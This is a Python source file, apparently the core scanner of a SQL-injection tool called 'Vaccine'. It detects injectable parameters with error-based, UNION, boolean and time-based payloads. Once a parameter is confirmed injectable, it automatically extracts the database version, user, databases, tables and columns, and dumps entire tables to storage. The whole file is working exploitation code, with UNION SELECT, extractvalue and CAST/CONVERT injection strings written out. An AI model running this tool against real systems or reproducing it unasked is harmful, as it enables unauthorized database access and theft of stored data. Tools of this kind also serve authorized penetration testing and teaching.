#!/usr/bin/env python3
import time
from urllib.parse import urlencode

from core.payloads import PAYLOADS, CANARY, EXTRACTION_QUERIES
from core.fingerprint import fingerprint_or_all
from core.requester import Requester
from core.storage import Storage

# ---------------------------------------------------------------------------
# Scanner — core injection loop for Vaccine
#
# Flow:
#   1. Fingerprint DB engine(s) to test
#   2. For each param × engine × method: run detection
#   3. On confirmed vulnerability: run extractor queries
#   4. Store all findings via Storage
# ---------------------------------------------------------------------------

MAX_UNION_COLS    = 10    # max columns to probe for UNION
TIME_THRESHOLD    = 4.0   # seconds — response slower than this = time-based hit
BOOL_LENGTH_DELTA = 20    # chars — true/false response length diff threshold


class Scanner:
    def __init__(self, config):
        self.config = config
        self.requester = Requester(headers=config.headers)
        self.storage = Storage(config.archive_path)
        self.findings = []

    # ── Public entry point ──────────────────────────────────────────────────────

    def run(self):
        """Full scan: fingerprint → inject → extract → store."""
        print(f"\n[*] Target  : {self.config.url}")
        print(f"[*] Method  : {self.config.method}")
        print(f"[*] Params  : {[p['name'] for p in self.config.params]}\n")

        engines = fingerprint_or_all(
            self.requester,
            self.config.method,
            self.config.url,
            self.config.params,
            self.config.post_data,
        )
        print(f"[*] Engines to test: {engines}\n")

        for param in self.config.params:
            print(f"[>>] Testing parameter: {param['name']}")
            for engine in engines:
                self._test_param(param, engine)

        if self.findings:
            print(f"\n[+] {len(self.findings)} vulnerability/vulnerabilities found.")
            self.storage.save(self.findings)
            print(f"[+] Results saved to: {self.config.archive_path}")
        else:
            print("\n[-] No SQL injection vulnerabilities detected.")

    # ── Per-parameter testing ───────────────────────────────────────────────

    def _test_param(self, param: dict, engine: str):
        for method_name in ["error", "union", "boolean", "time"]:
            payloads = PAYLOADS[method_name].get(engine, [])
            if not payloads:
                continue

            result = None
            if method_name == "error":
                result = self._test_error(param, engine, payloads)
            elif method_name == "union":
                result = self._test_union(param, engine)
            elif method_name == "boolean":
                result = self._test_boolean(param, engine, payloads)
            elif method_name == "time":
                result = self._test_time(param, engine, payloads)

            if result:
                print(f"  [+] VULNERABLE — param='{param['name']}' engine={engine} method={method_name}")
                print(f"      payload: {result['payload']}")
                self._extract(param, engine, result)
                return  # one confirmed method is enough per param+engine combo

    # ── Detection methods ────────────────────────────────────────────────────────

    def _test_error(self, param, engine, payloads):
        for p in payloads:
            response = self._inject(param, p["raw"])
            if response is None:
                continue
            body_lower = response["body"].lower()
            if any(sig.lower() in body_lower for sig in p["detect"]):
                return {"method": "error", "payload": p["raw"], "engine": engine}
        return None

    def _test_union(self, param, engine):
        """Probe column count via ORDER BY, then confirm via UNION SELECT + canary."""
        col_count = self._probe_column_count(param)
        if col_count is None:
            return None

        for canary_pos in range(col_count):
            cols = ["NULL"] * col_count
            cols[canary_pos] = f"'{CANARY}'"
            cols_str = ",".join(cols)
            raw = f"' UNION SELECT {cols_str}-- -"

            response = self._inject(param, raw)
            if response and CANARY in response["body"]:
                return {
                    "method":         "union",
                    "payload":        raw,
                    "engine":         engine,
                    "col_count":      col_count,
                    "injectable_col": canary_pos,
                }
        return None

    def _probe_column_count(self, param) -> int | None:
        """Find column count via ORDER BY iteration."""
        for n in range(1, MAX_UNION_COLS + 1):
            raw = f"' ORDER BY {n}-- -"
            response = self._inject(param, raw)
            if response is None:
                return None
            body_lower = response["body"].lower()
            order_errors = [
                "unknown column",
                "1st order by term out of range",
                "order by position number",
                "is out of range",
                "invalid column index",
            ]
            if any(e in body_lower for e in order_errors):
                return n - 1 if n > 1 else None
        return None

    def _test_boolean(self, param, engine, payloads):
        baseline = self._send_clean(param)
        if baseline is None:
            return None
        baseline_len = len(baseline["body"])

        for p in payloads:
            resp_true  = self._inject(param, p["true"])
            resp_false = self._inject(param, p["false"])
            if resp_true is None or resp_false is None:
                continue

            len_true  = len(resp_true["body"])
            len_false = len(resp_false["body"])

            true_matches_baseline = abs(len_true - baseline_len) < BOOL_LENGTH_DELTA
            responses_differ      = abs(len_true - len_false)    > BOOL_LENGTH_DELTA

            if true_matches_baseline and responses_differ:
                return {"method": "boolean", "payload": p["true"], "engine": engine}
        return None

    def _test_time(self, param, engine, payloads):
        for p in payloads:
            start = time.time()
            self._inject(param, p["raw"], timeout=p["sleep"] + 3)
            elapsed = time.time() - start
            if elapsed >= TIME_THRESHOLD:
                return {"method": "time", "payload": p["raw"], "engine": engine}
        return None

    # ── Data extraction ────────────────────────────────────────────────────────────

    def _extract(self, param, engine, vuln_info):
        """Run extraction queries and append a full finding to self.findings."""
        queries = EXTRACTION_QUERIES.get(engine, {})
        finding = {
            "param":   param["name"],
            "payload": vuln_info["payload"],
            "method":  vuln_info["method"],
            "engine":  engine,
            "data":    {},
        }

        if vuln_info["method"] in ("error", "union"):
            for key in ["version", "current_db", "current_user", "databases", "tables"]:
                result = self._run_extraction_query(param, engine, vuln_info, queries.get(key, ""))
                if result:
                    finding["data"][key] = result
                    print(f"      {key}: {result}")

            tables_raw = finding["data"].get("tables", "")
            if tables_raw:
                tables = [t.strip() for t in tables_raw.split("|") if t.strip()]
                finding["data"]["columns"] = {}
                finding["data"]["dump"]    = {}

                for table in tables:
                    col_query = queries.get("columns", "").replace("{table}", table)
                    cols_raw  = self._run_extraction_query(param, engine, vuln_info, col_query)
                    if cols_raw:
                        finding["data"]["columns"][table] = cols_raw
                        print(f"      columns[{table}]: {cols_raw}")

                        cols_list  = [c.strip() for c in cols_raw.split("|") if c.strip()]
                        cols_expr  = ",".join(cols_list)
                        dump_query = queries.get("dump", "").replace("{table}", table).replace("{cols}", cols_expr)
                        dump_raw   = self._run_extraction_query(param, engine, vuln_info, dump_query)
                        if dump_raw:
                            finding["data"]["dump"][table] = dump_raw
                            print(f"      dump[{table}]: {dump_raw}")

        self.findings.append(finding)

    def _run_extraction_query(self, param, engine, vuln_info, query: str) -> str | None:
        if not query:
            return None

        if vuln_info["method"] == "union":
            col_count      = vuln_info["col_count"]
            injectable_col = vuln_info["injectable_col"]
            cols = ["NULL"] * col_count
            cols[injectable_col] = f"({query})"
            raw = f"' UNION SELECT {','.join(cols)}-- -"

            response = self._inject(param, raw)
            return self._extract_value_from_body(response["body"]) if response else None

        elif vuln_info["method"] == "error":
            if engine == "mysql":
                raw = f"' AND extractvalue(1,concat(0x7e,({query})))-- -"
            elif engine in ("postgresql", "sqlite"):
                raw = f"' AND CAST(({query}) AS INTEGER)-- -"
            elif engine == "mssql":
                raw = f"' AND CONVERT(int,({query}))-- -"
            else:
                return None

            response = self._inject(param, raw)
            return self._extract_value_from_error(response["body"], engine) if response else None

        return None

    # ── Response parsing helpers ────────────────────────────────────────────────

    def _extract_value_from_error(self, body: str, engine: str) -> str | None:
        import re
        patterns = {
            "mysql":      r"~([^<\n~]+)",
            "postgresql": r'invalid input syntax for type integer: "([^"]+)"',
            "mssql":      r"Conversion failed when converting the [^:]+: (.+?)(?:\.|<)",
            "sqlite":     r"datatype mismatch",
        }
        pattern = patterns.get(engine)
        if not pattern:
            return None
        match = re.search(pattern, body, re.IGNORECASE)
        return match.group(1).strip() if match else None

    def _extract_value_from_body(self, body: str) -> str | None:
        import re
        match = re.search(r"([\w@.\-]+(?:\|[\w@.\-]+)+)", body)
        return match.group(1) if match else None

    # ── HTTP helpers ───────────────────────────────────────────────────────────────

    def _inject(self, param: dict, raw_payload: str, timeout: int = None) -> dict | None:
        injected_value = param["value"] + raw_payload
        old_timeout = self.requester.timeout

        try:
            if timeout:
                self.requester.timeout = timeout

            if self.config.method == "GET":
                probe_params = {
                    p["name"]: (injected_value if p["name"] == param["name"] else p["value"])
                    for p in self.config.params
                }
                return self.requester.send(self.config.method, self.config.url, params=probe_params)
            else:
                probe_data = {
                    p["name"]: (injected_value if p["name"] == param["name"] else p["value"])
                    for p in self.config.params
                }
                return self.requester.send(self.config.method, self.config.url, data=urlencode(probe_data))

        except RuntimeError:
            return None
        finally:
            self.requester.timeout = old_timeout

    def _send_clean(self, param: dict) -> dict | None:
        try:
            if self.config.method == "GET":
                clean_params = {p["name"]: p["value"] for p in self.config.params}
                return self.requester.send(self.config.method, self.config.url, params=clean_params)
            else:
                clean_data = {p["name"]: p["value"] for p in self.config.params}
                return self.requester.send(self.config.method, self.config.url, data=urlencode(clean_data))
        except RuntimeError:
            return None
